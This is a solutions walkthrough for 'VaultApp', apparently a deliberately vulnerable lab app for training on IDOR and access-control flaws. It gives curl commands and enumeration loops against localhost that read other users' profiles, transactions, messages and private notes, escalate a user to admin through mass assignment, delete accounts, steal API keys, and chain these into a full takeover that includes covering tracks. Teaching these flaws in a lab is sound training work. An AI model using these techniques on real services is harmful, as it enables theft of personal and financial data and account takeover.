# 🔓 VaultApp — IDOR Vulnerability Solutions Guide

> **SPOILER WARNING:** This file contains full exploitation walkthroughs for all 10 vulnerabilities. Only read this after you've attempted the challenges yourself!

---

## Vulnerability 1 — Sequential ID Enumeration (Horizontal IDOR)

**Endpoint:** `GET /api/users/[id]`  
**Difficulty:** Easy  
**Real-world equivalent:** Facebook user data exposure (2019), many HackerOne reports

### Exploitation

The endpoint returns any user's full profile when given their sequential integer ID. No ownership check is performed.

```bash
# Get your own profile (player = ID 42)
curl -H "Authorization: Bearer <YOUR_JWT>" http://localhost:3000/api/users/42

# Access another user's profile
curl -H "Authorization: Bearer <YOUR_JWT>" http://localhost:3000/api/users/1

# Access admin profile
curl -H "Authorization: Bearer <YOUR_JWT>" http://localhost:3000/api/users/299

# Enumerate all 300 users
for i in $(seq 1 300); do
  curl -s -H "Authorization: Bearer <YOUR_JWT>" http://localhost:3000/api/users/$i | jq '.username, .email, .ssn_last4'
done
```

### Data Exposed
- Username, email, phone, address
- Account number, balance
- Role (reveals admin accounts)
- SSN last 4 digits

---

## Vulnerability 2 — Query Parameter Manipulation (Transaction IDOR)

**Endpoint:** `GET /api/transactions?account_id=ACCT-XXXXX`  
**Difficulty:** Easy  
**Real-world equivalent:** Banking API transaction history leaks

### Exploitation

```bash
# Your transactions
curl -H "Authorization: Bearer <YOUR_JWT>" "http://localhost:3000/api/transactions?account_id=ACCT-00042"

# Someone else's transactions
curl -H "Authorization: Bearer <YOUR_JWT>" "http://localhost:3000/api/transactions?account_id=ACCT-00001"

# Admin transactions
curl -H "Authorization: Bearer <YOUR_JWT>" "http://localhost:3000/api/transactions?account_id=ACCT-00299"
```

### Burp Suite
1. Navigate to /transactions in the app
2. In Burp, find the GET request to `/api/transactions?account_id=ACCT-00042`
3. Send to Repeater → change `ACCT-00042` to `ACCT-00001` → Send

### Data Exposed
- Complete transaction history for any user
- From/to account numbers, amounts, descriptions
- Transaction statuses and dates

---

## Vulnerability 3 — POST Body Object Reference (Message IDOR)

**Endpoint:** `POST /api/messages/read`  
**Difficulty:** Medium  
**Real-world equivalent:** Private messaging platform data leaks

### Exploitation

```bash
# Read your own message
curl -X POST -H "Authorization: Bearer <YOUR_JWT>" \
  -H "Content-Type: application/json" \
  -d '{"message_id": 165}' \
  http://localhost:3000/api/messages/read

# Read someone else's message
curl -X POST -H "Authorization: Bearer <YOUR_JWT>" \
  -H "Content-Type: application/json" \
  -d '{"message_id": 1}' \
  http://localhost:3000/api/messages/read

# Enumerate all messages looking for sensitive ones
for i in $(seq 1 1200); do
  result=$(curl -s -X POST -H "Authorization: Bearer <YOUR_JWT>" \
    -H "Content-Type: application/json" \
    -d "{\"message_id\": $i}" \
    http://localhost:3000/api/messages/read)
  echo "$result" | grep -i "password\|ssn\|recovery" && echo "^^^ Message ID: $i"
done
```

### Data Exposed
- Private message content between any users
- Sensitive data in messages: temporary passwords, SSN references
- Sender/receiver identities and emails

---

## Vulnerability 4 — Mass Assignment (Privilege Escalation)

**Endpoint:** `POST /api/profile/update`  
**Difficulty:** Medium  
**Real-world equivalent:** GitHub Enterprise mass assignment (CVE-2012-5664)

### Exploitation

```bash
# Normal profile update (what the frontend sends)
curl -X POST -H "Authorization: Bearer <YOUR_JWT>" \
  -H "Content-Type: application/json" \
  -d '{"phone": "555-1234", "address": "123 Main St"}' \
  http://localhost:3000/api/profile/update

# Escalate to admin role
curl -X POST -H "Authorization: Bearer <YOUR_JWT>" \
  -H "Content-Type: application/json" \
  -d '{"phone": "555-1234", "role": "admin"}' \
  http://localhost:3000/api/profile/update

# Give yourself unlimited balance
curl -X POST -H "Authorization: Bearer <YOUR_JWT>" \
  -H "Content-Type: application/json" \
  -d '{"balance": 999999}' \
  http://localhost:3000/api/profile/update

# Change your password
curl -X POST -H "Authorization: Bearer <YOUR_JWT>" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin", "balance": 999999, "password": "hacked"}' \
  http://localhost:3000/api/profile/update
```

### Burp Suite
1. Edit your profile normally → intercept the POST request
2. In the JSON body, add `"role": "admin"` before forwarding
3. Check the response — you're now an admin

### Impact
- Full privilege escalation to admin
- Arbitrary balance modification
- Password change capability

---

## Vulnerability 5 — Base64 Encoded ID Bypass

**Endpoint:** `GET /api/documents/[encoded_id]`  
**Difficulty:** Medium  
**Real-world equivalent:** Obscurity-based "security" in document management systems

### Exploitation

```bash
# Documents use Base64-encoded IDs:
# "MTAw" = base64("100"), "MQ==" = base64("1")

# Decode an existing encoded_id
echo "MTAw" | base64 -d
# Output: 100

# Access document 1
echo -n "1" | base64
# Output: MQ==
curl -H "Authorization: Bearer <YOUR_JWT>" http://localhost:3000/api/documents/MQ==

# Access document 100
echo -n "100" | base64
# Output: MTAw
curl -H "Authorization: Bearer <YOUR_JWT>" http://localhost:3000/api/documents/MTAw

# Enumerate all 900 documents
for i in $(seq 1 900); do
  encoded=$(echo -n "$i" | base64)
  curl -s -H "Authorization: Bearer <YOUR_JWT>" \
    "http://localhost:3000/api/documents/$encoded" | jq '.title, .owner_username'
done
```

### Data Exposed
- Full document content for any user
- Financial statements with account balances, SSN
- Reports containing API keys

---

## Vulnerability 6 — UUID Information Leakage

**Endpoint:** `GET /api/users/profile/[uuid]`  
**Difficulty:** Medium  
**Real-world equivalent:** Uber ride receipt IDOR through UUID leakage

### Exploitation

**Step 1:** Visit `/directory` to collect UUIDs
**Step 2:** Use any UUID to access that user's full profile + API key

```bash
# Use a UUID from the directory page
curl -H "Authorization: Bearer <YOUR_JWT>" \
  http://localhost:3000/api/users/profile/<uuid-from-directory>
```

### Data Exposed
- Full user profile including **API key** (needed for Vuln 9)
- SSN last 4, balance, role, address

---

## Vulnerability 7 — DELETE IDOR (Vertical Privilege Escalation)

**Endpoint:** `DELETE /api/admin/users/[id]`  
**Difficulty:** Hard  
**Real-world equivalent:** Admin panel authorization bypass

### Exploitation

```bash
# Delete an admin account (you're just a "user" role!)
curl -X DELETE -H "Authorization: Bearer <YOUR_JWT>" \
  http://localhost:3000/api/admin/users/299

# Delete any user
curl -X DELETE -H "Authorization: Bearer <YOUR_JWT>" \
  http://localhost:3000/api/admin/users/1
```

### Key Lesson
The admin page shows "Access Denied" in the browser — but that's only a **client-side check**. The API route `/api/admin/users/[id]` has **no server-side role verification**.

### Impact
- Any authenticated user can delete any account
- Can delete admin accounts

---

## Vulnerability 8 — Private Note Access

**Endpoint:** `GET /api/notes/[id]`  
**Difficulty:** Easy  
**Real-world equivalent:** Google Docs privacy settings bypass

### Exploitation

```bash
# Access any note by ID, including private ones
curl -H "Authorization: Bearer <YOUR_JWT>" http://localhost:3000/api/notes/1

# Enumerate private notes that contain secrets
for i in $(seq 1 600); do
  result=$(curl -s -H "Authorization: Bearer <YOUR_JWT>" http://localhost:3000/api/notes/$i)
  is_private=$(echo "$result" | jq -r '.is_private')
  if [ "$is_private" = "true" ]; then
    echo "=== Private Note #$i ==="
    echo "$result" | jq '.title, .body'
  fi
done
```

### Data Exposed
- Private notes with API keys, passwords, credit card numbers
- Security answers and recovery codes

---

## Vulnerability 9 — API Key Impersonation (Chained Attack)

**Endpoint:** `GET /api/account/export`  
**Header:** `X-API-Key: <api_key>`  
**Difficulty:** Hard  
**Real-world equivalent:** API key misuse in SaaS platforms

### Exploitation (Chained with Vuln 6)

**Step 1:** Get a target's API key via Vulnerability 6
```bash
curl -H "Authorization: Bearer <YOUR_JWT>" \
  http://localhost:3000/api/users/profile/<target-uuid>
# Note the api_key field in the response
```

**Step 2:** Use their API key to export their entire account
```bash
curl -H "Authorization: Bearer <YOUR_JWT>" \
  -H "X-API-Key: <stolen-api-key>" \
  http://localhost:3000/api/account/export
```

### Data Exposed
- Complete account export: profile + all transactions + all documents
- Full data exfiltration of any user's account

---

## Vulnerability 10 — Admin Audit Log Exposure

**Endpoint:** `GET /api/admin/audit-logs?user_id=[id]`  
**Difficulty:** Medium  
**Real-world equivalent:** Admin dashboard access control failures

### Exploitation

```bash
# View your own audit logs
curl -H "Authorization: Bearer <YOUR_JWT>" \
  "http://localhost:3000/api/admin/audit-logs?user_id=42"

# View admin audit logs (reveals admin activity)
curl -H "Authorization: Bearer <YOUR_JWT>" \
  "http://localhost:3000/api/admin/audit-logs?user_id=299"

curl -H "Authorization: Bearer <YOUR_JWT>" \
  "http://localhost:3000/api/admin/audit-logs?user_id=300"
```

### Data Exposed
- Admin login activity, password resets, role changes
- IP addresses of admin logins
- Full audit trail revealing admin operations

---

## 🏆 Attack Chain: Full Account Takeover

Combine multiple vulnerabilities for maximum impact:

1. **Vuln 1** → Enumerate all users, find admin accounts (IDs 299, 300)
2. **Vuln 6** → Get admin's UUID from /directory, then get their API key
3. **Vuln 9** → Use stolen API key to export admin's entire account
4. **Vuln 4** → Escalate your own role to admin
5. **Vuln 10** → View audit logs to cover your tracks
6. **Vuln 7** → Delete the original admin to maintain persistence

This demonstrates how seemingly "low severity" IDOR bugs can be chained into a complete system compromise.
